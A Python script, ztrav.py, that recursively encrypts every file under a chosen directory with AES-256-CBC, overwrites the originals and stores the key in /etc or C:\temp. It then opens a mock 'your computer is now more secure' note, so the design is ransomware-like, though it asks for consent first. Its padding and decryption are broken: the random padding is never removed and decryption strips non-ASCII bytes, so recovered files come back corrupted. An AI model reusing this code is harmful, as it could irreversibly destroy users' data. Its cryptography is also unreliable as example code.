''' This script will traverse the hard-coded directory and check if subdirectories are writable or not. If they are writable, it will apply an AES-256 encryption operation
    to the file. The symmetric key will be provided as output in the form of a .pem file. There are also decryption options if the invoker posseses key_material.pem
'''

# UNRESOLVED: padding is handled manually with pad_data(), so the decrypted data has extra characters appended. Should be easy fix with a cryptography library function

'''
Steps:

    1. Warn user
    1. Process command line arguments
    2. create symmetric key and IV 
    2. output the key and the IV in 2 .pem files respectively as shown in the AES_encrypt.py script
    3. traverse base directory recursively
    3. if a directory is writable, enter --> no is_writable function, this is handled with a try except block
    4. for all files in directory, if writable, enter
    5. open the file in binary mode, encrypt as shown in the AES_encrypt.py script --> wait before doing next file in loop
    6. Make a list of directories that are on all Windows systems, iterate through. If one is writable, create a file, write to it, and open in in notepad for the user to see
    7. The file should read "Congratulations!!! Your computer is now more secure. Please save the key and IV .pem files as needed."

'''

''' Functions required:

    1. User warning
    1. process args
    2. create key
    2. create IV
    3. output key and IV
    4. traverse base directory
    5. check for write permissions directory edition --> these are probably handled with the try except... I guess we'll see
    6. check for write permissions file edition
    7. encrypt file (recycle this from AES_encrypt.py)
    8. leave the note once finished as all helpful security professionals do

'''

''' arguments: base_directory -r [rate_in_seconds] -s [operating_system] -m [encrypt or decrypt]'''

import argparse
import os
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import subprocess
import re

def program_warning():
    print('This script will recursively encrypt entire directories using the AES-256 encryption algorithm.\nUpon encryption of material, this program will output both the symmetric 256-bit encryption key and the 128-bit initialization vector to an output file called key_material.txt.\nThe number of padded bytes will be output to a file called padding.txt.\nThe destined decryptor of the cipher material requires the information in these files for decryption.\nKnowing that this program can irreversibly alter files, enter y to continue.')
    answer = input('>> ')
    if answer == 'y' or answer == 'Y':
        return 0
    else:
        exit(0)

def process_arguments():
    parser = argparse.ArgumentParser(
        prog='ztrav.py',
        description='Takes a base directory and recursively encrypts it using AES-256 in CBC mode. Symmetric Key and IV are left as output in an untouched directory (key_material.pem).',
        epilog='The options -r [RATE IN SECONDS] -m [encrypt or decrypt] -p [PEM FILE] followed by positional arguments BASE_DIRECTORY SYSTEM (windows or unix)\n\n')

    parser.add_argument('base_directory')           # positional argument
    parser.add_argument('system')
    parser.add_argument('-r', '--rate')             # option that takes a value
    parser.add_argument('-m', '--mode')
    parser.add_argument('-p', '--pem')
    arguments = parser.parse_args()
    if (arguments.mode == 'decrypt' and not arguments.pem):
        print('Files cannot be decrypted without a key and IV. These should be stored in key_material.pem.\nExiting...')
        exit(0)
    return arguments

def create_key():
    symmetric_key = os.urandom(32)
    return symmetric_key

def create_IV():
    initialization_vector = os.urandom(16)
    return initialization_vector

def make_key_material_file(symmetric_key, initialization_vector, arguments):
    delineator = system_decider(arguments)
    if (delineator == '/'):
        filename = '/etc/key_material.pem'                                      # make sure this is writable to an unprivileged user
    elif (delineator == '\\'):
            filename = r'C:\temp\key_material.pem'
    iv_base64 = base64.b64encode(initialization_vector)
    sk_base64 = base64.b64encode(symmetric_key)
    note1 = b'Initialization Vector: '
    note2 = b' Symmetric Key: '
    with open(filename, 'wb') as file:
        file.write(note1)
        file.write(iv_base64)
        file.write(note2)
        file.write(sk_base64)

def system_decider(arguments):                                                  # This can be used in place of os.path.join
    irrespectiveCaseName = str(arguments.system).upper()
    if (irrespectiveCaseName == 'WINDOWS'):
        delineator = '\\'
        return delineator
    elif(irrespectiveCaseName == 'UNIX'):
        delineator = '/'
        return delineator
    else:
        print('Invalid system type given. Enter windows or unix. Exiting...')
        exit(-1)

def traverse(base_directory, arguments, symmetric_key, initialization_vector):
    # delineator = system_decider(arguments)
    mode = arguments.mode
    try:
        if (os.path.isdir(base_directory) == False and os.path.isfile(base_directory) == False):
            print('Error Encountered! Not a file or directory!!!')
            exit(-1)
        for entry in os.listdir(base_directory):
            # full_path = base_directory + delineator + entry
            full_path = os.path.join(base_directory, entry)
            if (os.path.isdir(full_path) == True):
                traverse(full_path, arguments, symmetric_key, initialization_vector)
            elif (os.path.isfile(full_path)):
                if (mode == 'encrypt'):
                    encrypt(full_path, symmetric_key, initialization_vector)
                elif (mode == 'decrypt'):
                    pem_file = arguments.pem
                    if (not pem_file):
                        print('No pem file given. Exiting...')
                        exit(0)
                    decrypt(full_path, arguments)
                else:
                    print(f'Invalid mode option given: {mode}')
                    exit(0)
    except Exception as exception:
        print(f'Exception raised: {exception}. Moving along from traverse...')
        pass

def pad_data(data, block_size):
    padding_length = block_size - (len(data) % block_size)
    # padding = bytes([padding_length] * padding_length)            # this pads with the same byte over and over again
    padding = os.urandom(padding_length)
    # with open('padding_info.txt', 'wb') as file:
    #     file.write(padding)
    return data + padding

def encrypt(path, symmetric_key, initialization_vector):
    try:
        with open(path, 'rb') as file:
            plain_text = file.read()
        plain_text = pad_data(plain_text, 16)
        cipher_object = Cipher(algorithms.AES(symmetric_key), modes.CBC(initialization_vector))
        encryptor_object = cipher_object.encryptor()
        cipher_text = encryptor_object.update(plain_text) + encryptor_object.finalize()
        with open(path, 'wb') as file:
            file.write(cipher_text)
    except Exception as exception:
        print(f'Exception raised: {exception}. Moving Along...')
        pass
    
def decrypt(path, arguments):
    try:
        keys = extract_keys_from_file(arguments)
        symmetric_key = keys[0]
        initialization_vector = keys[1]
        with open(path, 'rb') as file:
            cipher_text = file.read()
        cipher_object = Cipher(algorithms.AES(symmetric_key), modes.CBC(initialization_vector))
        decryptor_object = cipher_object.decryptor()
        plain_text = decryptor_object.update(cipher_text) + decryptor_object.finalize()
        with open(path, 'w') as file:
            for letter in plain_text:
                if chr(letter).isascii() == True:                                                           # Padding ended up not being removed because it was overly arduous :(
                    file.write(chr(letter))
    except Exception as exception:
        print(f'Exception raised: {exception}. Moving Along from decrypt...')
        pass

def extract_keys_from_file(arguments):
    pem_file = arguments.pem
    with open(pem_file, 'rb') as file:
        file_content = file.read()
    iv_pattern = b'Initialization Vector:\\s*([A-Za-z0-9+/=]+)'
    key_pattern = b'Symmetric Key:\\s*([A-Za-z0-9+/=]+)'
    iv_match = re.search(iv_pattern, file_content)
    key_match = re.search(key_pattern, file_content)
    iv = iv_match.group(1)
    key = key_match.group(1)
    keys = []
    keys.append(base64.b64decode(key))                  # May autocomplete be cursed 1000 times over
    keys.append(base64.b64decode(iv))
    return keys

def post_operation_affirmation(arguments):
    if (arguments.mode == 'encrypt'):
        message = 'Congratulations!!!\n\nYour computer is now more secure.\n\nPlease locate the key and IV .pem files as needed in either ~/key_material.pem or C:\\Temp\\key_material.pem.'
        delineator = system_decider(arguments)
        if (delineator == '/'):
            filename = '~/affirmation.txt'
            opening_application = 'vim'
        elif (delineator == '\\'):
            filename = r'C:\temp\affirmation.txt'
            opening_application = 'notepad.exe'
        command = [opening_application, filename]
        with open(filename, 'w') as file:
            file.write(message)
        subprocess.run(command)
        exit(0)
    else:
        exit(0)

if __name__ == "__main__":
    arguments = process_arguments()
    program_warning()
    if (arguments.mode == 'encrypt'):
        symmetric_key = create_key()
        initialization_vector = create_IV()
        make_key_material_file(symmetric_key, initialization_vector, arguments)                     # No wonder it's not decrypting, it's a new key. whoops
    elif (arguments.mode == 'decrypt'):
        symmetric_key = 1                                                                           # These 1s are placeholders, this should have been handled differently in development
        initialization_vector = 1
    else:
        print(f'Invalid mode given: {arguments.mode}.\nExiting...')
        exit(0)
    traverse(arguments.base_directory, arguments, symmetric_key, initialization_vector)
    post_operation_affirmation(arguments)